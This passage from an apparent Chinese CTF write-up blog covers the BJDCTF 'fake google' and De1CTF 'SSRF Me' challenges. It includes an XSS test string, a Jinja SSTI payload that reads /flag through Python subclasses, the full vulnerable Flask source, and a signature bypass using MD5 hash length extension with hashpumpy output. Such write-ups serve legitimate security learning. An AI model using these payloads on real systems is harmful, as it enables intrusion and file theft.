&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;找到了利用文件： &amp;#x27;&lt;/span&gt;+file+&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;  and 找到了利用的参数：%s&amp;quot;&lt;/span&gt; %param)&lt;br&gt;        &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;结束时间：  &amp;#x27;&lt;/span&gt; + time.asctime(time.localtime(time.time())))&lt;br&gt;    s1.release()&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; files:															&lt;span class=&#34;hljs-comment&#34;&gt;#加入多线程&lt;/span&gt;&lt;br&gt;   t = threading.Thread(target=get_content, args=(i,))&lt;br&gt;   t.start()&lt;br&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;果然还是菜的惨不忍睹&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;bjdctf-2ndfake-google&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bjdctf-2ndfake-google&#34;&gt;#&lt;/a&gt; [BJDCTF 2nd]fake google&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;测试 &lt;code&gt;&amp;lt;script&amp;gt;alert(111)&amp;lt;/script&amp;gt;&lt;/code&gt;  可以执行&lt;/li&gt;
&lt;li&gt;查看网页源代码提示 ssti&lt;/li&gt;
&lt;li&gt;?name=3测试的确存在 ssti&lt;/li&gt;
&lt;li&gt;最终 payload： &lt;code&gt;?name=&amp;#123;&amp;#123;True.__class__.__mro__[1].__subclasses__()[177].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;/flag&#39;).read()&amp;#125;&amp;#125;&lt;/code&gt;  直接拿到 flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;de1ctf-2019ssrf-me&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#de1ctf-2019ssrf-me&#34;&gt;#&lt;/a&gt; [De1CTF 2019]SSRF Me&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;访问拿到源码，源码审计&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#! /usr/bin/env python&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#encoding=utf-8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; flask &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; Flask&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; flask &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; request&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; socket&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; hashlib&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; urllib&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; sys&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; os&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; json&lt;br&gt;reload(sys)&lt;br&gt;sys.setdefaultencoding(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;latin1&amp;#x27;&lt;/span&gt;)&lt;br&gt;&lt;br&gt;app = Flask(__name__)&lt;br&gt;&lt;br&gt;secert_key = os.urandom(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Task&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__init__&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;self, action, param, sign, ip&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;        self.action = action&lt;br&gt;        self.param = param&lt;br&gt;        self.sign = sign&lt;br&gt;        self.sandbox = md5(ip)&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;not&lt;/span&gt; os.path.exists(self.sandbox)):          &lt;span class=&#34;hljs-comment&#34;&gt;#SandBox For Remote_Addr&lt;/span&gt;&lt;br&gt;            os.mkdir(self.sandbox)&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Exec&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;        result = &amp;#123;&amp;#125;&lt;br&gt;        result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;code&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;500&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (self.checkSign()):&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;scan&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; self.action:&lt;br&gt;                tmpfile = &lt;span class=&#34;hljs-built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;./%s/result.txt&amp;quot;&lt;/span&gt; % self.sandbox, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;w&amp;#x27;&lt;/span&gt;)&lt;br&gt;                resp = scan(self.param)&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (resp == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Connection Timeout&amp;quot;&lt;/span&gt;):&lt;br&gt;                    result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;data&amp;#x27;&lt;/span&gt;] = resp&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;                    &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt; resp&lt;br&gt;                    tmpfile.write(resp)&lt;br&gt;                    tmpfile.close()&lt;br&gt;                result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;code&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;200&lt;/span&gt;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;read&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; self.action:&lt;br&gt;                f = &lt;span class=&#34;hljs-built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;./%s/result.txt&amp;quot;&lt;/span&gt; % self.sandbox, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;)&lt;br&gt;                result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;code&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;200&lt;/span&gt;&lt;br&gt;                result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;data&amp;#x27;&lt;/span&gt;] = f.read()&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;code&amp;#x27;&lt;/span&gt;] == &lt;span class=&#34;hljs-number&#34;&gt;500&lt;/span&gt;:&lt;br&gt;                result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;data&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Action Error&amp;quot;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;            result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;code&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;500&lt;/span&gt;&lt;br&gt;            result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;msg&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Sign Error&amp;quot;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;checkSign&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (getSign(self.action, self.param) == self.sign):&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;False&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#generate Sign For Action Scan.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;@app.route(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/geneSign&amp;quot;&lt;/span&gt;, methods=[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;GET&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;POST&amp;#x27;&lt;/span&gt;]&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;geneSign&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;    param = urllib.unquote(request.args.get(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;param&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;))&lt;br&gt;    action = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;scan&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; getSign(action, param)&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;@app.route(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/De1ta&amp;#x27;&lt;/span&gt;,methods=[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;GET&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;POST&amp;#x27;&lt;/span&gt;]&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;challenge&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;    action = urllib.unquote(request.cookies.get(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;action&amp;quot;&lt;/span&gt;))&lt;br&gt;    param = urllib.unquote(request.args.get(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;param&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;))&lt;br&gt;    sign = urllib.unquote(request.cookies.get(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;sign&amp;quot;&lt;/span&gt;))&lt;br&gt;    ip = request.remote_addr&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(waf(param)):&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;No Hacker!!!!&amp;quot;&lt;/span&gt;&lt;br&gt;    task = Task(action, param, sign, ip)&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; json.dumps(task.Exec())&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;@app.route(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;index&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;code.txt&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;).read()&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;scan&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;param&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;    socket.setdefaulttimeout(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt;:&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; urllib.urlopen(param).read()[:&lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt;]&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;except&lt;/span&gt;:&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Connection Timeout&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;getSign&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;action, param&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; hashlib.md5(secert_key + param + action).hexdigest()&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;md5&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; hashlib.md5(content).hexdigest()&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;waf&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;param&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;    check=param.strip().lower()&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; check.startswith(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;gopher&amp;quot;&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;or&lt;/span&gt; check.startswith(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;file&amp;quot;&lt;/span&gt;):&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;False&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;:&lt;br&gt;    app.debug = &lt;span class=&#34;hljs-literal&#34;&gt;False&lt;/span&gt;&lt;br&gt;    app.run(host=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;0.0.0.0&amp;#x27;&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可以看到对文件执行操作的有两个，一个 scan，一个 read，scan 把文件写道 resault.txt，而 read 可以读文件。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;但是要实现读写文件就要突破 hash 的验证。这里主要有两个方法来突破验证，一个是通过本身的代码来绕过，另外一个是通过 hashpumpy 工具来绕过&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过本身代码绕过：
&lt;ol&gt;
&lt;li&gt;因为判断是 scan 还是 read 操作用的是 &lt;code&gt;in&lt;/code&gt;  而不是 &lt;code&gt;=&lt;/code&gt; , 所以我们可以传入 scanread 实现同时操作&lt;/li&gt;
&lt;li&gt;哈希判断： &lt;code&gt;md5(secert_key+param+action)&lt;/code&gt; ,secert_key 是固定的，param 和 action 可控，而 &lt;code&gt;/geneSign&lt;/code&gt;  可以拿到加密后的 hash 值，当我们传入 param=flag.txtread 时，等式左边等于 &lt;code&gt;md5(secert_key+&#39;flag.txtread&#39;+&#39;scan&#39;)&lt;/code&gt; , 然后我们访问 &lt;code&gt;/De1ta&lt;/code&gt;  时 param=flag.txt&amp;amp;action=readscan, 此时两个 md5 值相等也就绕过了验证，把第一步得到的 hash 传入第二部即可拿到 flag&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;利用哈希长度拓展攻击 hashpumpy 工具绕过
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;hashpumpy.hashpump(&#39;a36a5ba0e8b9bb78094cbdb641007508&#39;, &#39;scan&#39;, &#39;read&#39;, 24)&lt;/code&gt; =&amp;gt; &lt;code&gt;(&#39;ca08c49a467b1e8b465aa6acb96f20f1&#39;, &#39;scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;传入 param=flag.txt，action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00% e0%00%00%00%00%00%00%00read，sing=ca08c49a467b1e8b465aa6acb96f20f1 即可拿到 flag&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;bjdctf-2ndold-hack&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bjdctf-2ndold-hack&#34;&gt;#&lt;/a&gt; [BJDCTF 2nd]old-hack&lt;/h2&gt;
